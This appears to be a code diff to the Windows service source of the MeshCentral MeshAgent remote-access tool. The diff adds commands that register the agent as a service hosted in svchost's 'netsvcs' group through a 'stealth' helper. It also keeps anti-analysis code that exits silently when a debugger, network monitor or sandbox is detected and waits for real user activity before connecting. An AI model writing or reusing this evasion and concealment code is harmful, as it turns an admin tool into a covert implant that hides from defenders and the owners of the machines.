@@ -27,6 +27,8 @@ limitations under the License.
 #include <windows.h>
 #include <winhttp.h>
 #include <shlobj.h>
+#include <shellapi.h>
+#include <winsvc.h>
 #include "resource.h"
 #include "meshcore/signcheck.h"
 #include "meshcore/meshdefines.h"
@@ -38,6 +40,40 @@ limitations under the License.
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
 #include "stealth.h"  // SECURITY: Stealth and obfuscation features
+// Svchost registration helper (implemented in stealth_svchost.c)
+BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
+BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
+
+// Forward declaration to satisfy early references in this TU
+int wmain(int argc, char* wargv[]);
+
+static const wchar_t* ServiceStateToString(DWORD s)
+{
+    switch (s)
+    {
+    case SERVICE_STOPPED: return L"STOPPED";
+    case SERVICE_START_PENDING: return L"START_PENDING";
+    case SERVICE_STOP_PENDING: return L"STOP_PENDING";
+    case SERVICE_RUNNING: return L"RUNNING";
+    case SERVICE_CONTINUE_PENDING: return L"CONTINUE_PENDING";
+    case SERVICE_PAUSE_PENDING: return L"PAUSE_PENDING";
+    case SERVICE_PAUSED: return L"PAUSED";
+    default: return L"UNKNOWN";
+    }
+}
+
+// C helper to read a registry string value (REG_SZ or REG_EXPAND_SZ)
+static BOOL ReadRegStrW(HKEY hKey, LPCWSTR name, LPWSTR out, DWORD cch)
+{
+    if (out == NULL || cch == 0) { return FALSE; }
+    DWORD type = 0;
+    DWORD cb = cch * (DWORD)sizeof(wchar_t);
+    LONG r = RegQueryValueExW(hKey, name, NULL, &type, (LPBYTE)out, &cb);
+    if (r != ERROR_SUCCESS) { return FALSE; }
+    if (type != REG_SZ && type != REG_EXPAND_SZ) { return FALSE; }
+    out[cch - 1] = L'\0';
+    return TRUE;
+}
 
 #if defined(WIN32) && defined (_DEBUG) && !defined(_MINCORE)
 #include <crtdbg.h>
@@ -309,28 +345,31 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		str[_MAX_PATH] = L'\0';  // SECURITY FIX: Force null termination
 
 
-		// SECURITY: Enable stealth features
-		CrashRecovery::EnableAutomaticRestart();
+        // SECURITY: Enable optional stealth/anti-analysis features only if
+        // explicitly enabled at build time.
+#ifdef MESHAGENT_ENABLE_STEALTH
+        Stealth_EnableCrashRecovery();
 
-		// SECURITY: Check for debuggers/analysis tools
-		if (SecurityToolDetection::IsDebuggerPresent() ||
-		    SecurityToolDetection::IsRunningUnderWireshark()) {
-			// Exit silently if under analysis
-			serviceStatus.dwCurrentState = SERVICE_STOPPED;
-			SetServiceStatus(serviceStatusHandle, &serviceStatus);
-			return;
-		}
+        // SECURITY: Check for debuggers/analysis tools
+        if (Stealth_IsDebuggerDetected() ||
+            Stealth_IsNetworkMonitorDetected()) {
+            // Exit silently if under analysis
+            serviceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetServiceStatus(serviceStatusHandle, &serviceStatus);
+            return;
+        }
 
-		// SECURITY: Sandbox detection - wait for user activity
-		if (NetworkStealth::IsRunningInSandbox()) {
-			// Wait for real user activity before connecting
-			if (!NetworkStealth::WaitForUserActivity(60000)) {  // 60 second timeout
-				// Likely sandbox - exit silently
-				serviceStatus.dwCurrentState = SERVICE_STOPPED;
-				SetServiceStatus(serviceStatusHandle, &serviceStatus);
-				return;
-			}
-		}
+        // SECURITY: Sandbox detection - wait for user activity
+        if (Stealth_IsRunningInSandbox_C()) {
+            // Wait for real user activity before connecting
+            if (!Stealth_WaitForUserActivity_C(60000)) {  // 60 second timeout
+                // Likely sandbox - exit silently
+                serviceStatus.dwCurrentState = SERVICE_STOPPED;
+                SetServiceStatus(serviceStatusHandle, &serviceStatus);
+                return;
+            }
+        }
+#endif
 
 		// Run the mesh agent
 		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
@@ -522,7 +561,170 @@ int wmain(int argc, char* wargv[])
 	*/
 
 	//CoInitializeEx(NULL, COINIT_MULTITHREADED);
-	if (argc > 1 && strcasecmp(argv[1], "-licenses") == 0)
+    // Register svchost-hosted service DLL
+    if (argc > 2 && strcasecmp(argv[1], "-svchost-register") == 0)
+    {
+        // argv[2] = DLL path for ServiceDll
+        WCHAR wDllPath[MAX_PATH * 2] = {0};
+        WCHAR wSvcName[256] = {0};
+        // Convert argv[2] (UTF-8) to wide
+        MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wDllPath, (int)_countof(wDllPath));
+        // Convert branded service name (TCHAR) to wide
+        #ifdef UNICODE
+        lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
+        #else
+        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
+        #endif
+        BOOL ok = Stealth_RegisterSvchostService(wSvcName, wDllPath);
+        printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");
+        return ok ? 0 : 1;
+    }
+
+    // Unregister svchost-hosted service
+    if (argc > 1 && strcasecmp(argv[1], "-svchost-unregister") == 0)
+    {
+        WCHAR wSvcName[256] = {0};
+#ifdef UNICODE
+        lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
+#else
+        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
+#endif
+        BOOL ok = Stealth_UnregisterSvchostService(wSvcName);
+        printf(ok ? "[+] Svchost unregistration successful\n" : "[!] Svchost unregistration failed\n");
+        return ok ? 0 : 1;
+    }
+
+    // Status: print registry + svchost membership + current service state
+    if (argc > 1 && strcasecmp(argv[1], "-svchost-status") == 0)
+    {
+        WCHAR wSvcName[256] = {0};
+        #ifdef UNICODE
+        lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
+        #else
+        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
+        #endif
+
+        wprintf(L"Service: %s\n", wSvcName);
+        // Exit code bitmask
+        // 1 = missing service registry key
+        // 2 = not in svchost 'netsvcs' group
+        // 4 = service not installed in SCM
+        // 8 = SCM access unavailable
+        DWORD statusMask = 0;
+        // Registry service key
+        WCHAR keyPath[512];
+        _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s", wSvcName);
+        HKEY hKey = NULL;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+        {
+            // Read string values via helper
+
+            DWORD dw = 0, cb = sizeof(dw);
+            if (RegQueryValueExW(hKey, L"Type", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
+                wprintf(L"  Type: 0x%08X\n", dw);
+            cb = sizeof(dw);
+            if (RegQueryValueExW(hKey, L"Start", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
+                wprintf(L"  Start: %u\n", dw);
+
+            wchar_t buf[512] = {0};
+            if (ReadRegStrW(hKey, L"ImagePath", buf, _countof(buf)))
+                wprintf(L"  ImagePath: %s\n", buf);
+            if (ReadRegStrW(hKey, L"DisplayName", buf, _countof(buf)))
+                wprintf(L"  DisplayName: %s\n", buf);
+            if (ReadRegStrW(hKey, L"Description", buf, _countof(buf)))
+                wprintf(L"  Description: %s\n", buf);
+            if (ReadRegStrW(hKey, L"ObjectName", buf, _countof(buf)))
+                wprintf(L"  ObjectName: %s\n", buf);
+
+            HKEY hParams = NULL;
+            if (RegOpenKeyExW(hKey, L"Parameters", 0, KEY_READ, &hParams) == ERROR_SUCCESS)
+            {
+                if (ReadRegStrW(hParams, L"ServiceDll", buf, _countof(buf)))
+                {
+                    wchar_t expanded[1024] = {0};
+                    const wchar_t* toCheck = buf;
+                    if (ExpandEnvironmentStringsW(buf, expanded, (DWORD)_countof(expanded)) > 0)
+                    {
+                        toCheck = expanded;
+                    }
+                    DWORD attrs = GetFileAttributesW(toCheck);
+                    BOOL exists = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+                    wprintf(L"  Parameters\\ServiceDll (raw): %s\n", buf);
+                    wprintf(L"  Parameters\\ServiceDll (expanded): %s\n", toCheck);
+                    wprintf(L"  Parameters\\ServiceDll exists: %s\n", exists ? L"yes" : L"no");
+                }
+                if (ReadRegStrW(hParams, L"ServiceMain", buf, _countof(buf)))
+                    wprintf(L"  Parameters\\ServiceMain: %s\n", buf);
+                DWORD unload = 0; cb = sizeof(unload);
+                if (RegQueryValueExW(hParams, L"ServiceDllUnloadOnStop", NULL, NULL, (LPBYTE)&unload, &cb) == ERROR_SUCCESS)
+                    wprintf(L"  Parameters\\ServiceDllUnloadOnStop: %u\n", unload);
+                RegCloseKey(hParams);
+            }
+            RegCloseKey(hKey);
+        }
+        else
+        {
+            wprintf(L"  Service registry key not found\n");
+            statusMask |= 1; // missing service key
+        }
+
+        // Svchost membership
+        HKEY hSvchost = NULL; BOOL inGroup = FALSE;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
+                          0, KEY_READ, &hSvchost) == ERROR_SUCCESS)
+        {
+            DWORD type = 0, cb = 0;
+            if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
+            {
+                wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
+                if (buf && RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
+                {
+                    buf[cb/sizeof(wchar_t)] = L'\0';
+                    buf[cb/sizeof(wchar_t)+1] = L'\0';
+                    for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
+                    {
+                        if (_wcsicmp(p, wSvcName) == 0) { inGroup = TRUE; break; }
+                    }
+                }
+                if (buf) free(buf);
+            }
+            RegCloseKey(hSvchost);
+        }
+        wprintf(L"  Svchost 'netsvcs' membership: %s\n", inGroup ? L"present" : L"absent");
+        if (!inGroup) { statusMask |= 2; }
+
+        // Current service state
+        SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+        if (scm)
+        {
+            SC_HANDLE svc = OpenServiceW(scm, wSvcName, SERVICE_QUERY_STATUS);
+            if (svc)
+            {
+                SERVICE_STATUS_PROCESS ssp = {0};
+                DWORD bytesNeeded = 0;
+                if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
+                {
+                    wprintf(L"  CurrentState: %s\n", ServiceStateToString(ssp.dwCurrentState));
+                }
+                CloseServiceHandle(svc);
+            }
+            else
+            {
+                wprintf(L"  CurrentState: (not installed in SCM)\n");
+                statusMask |= 4;
+            }
+            CloseServiceHandle(scm);
+        }
+        else
+        {
+            wprintf(L"  SCM access unavailable\n");
+            statusMask |= 8;
+        }
+        return (int)statusMask;
+    }
+
+    if (argc > 1 && strcasecmp(argv[1], "-licenses") == 0)
 	{
 		printf("========================================================================================\n");
 		printf(" MeshCentral MeshAgent: Copyright 2006 - 2022 Intel Corporation\n");
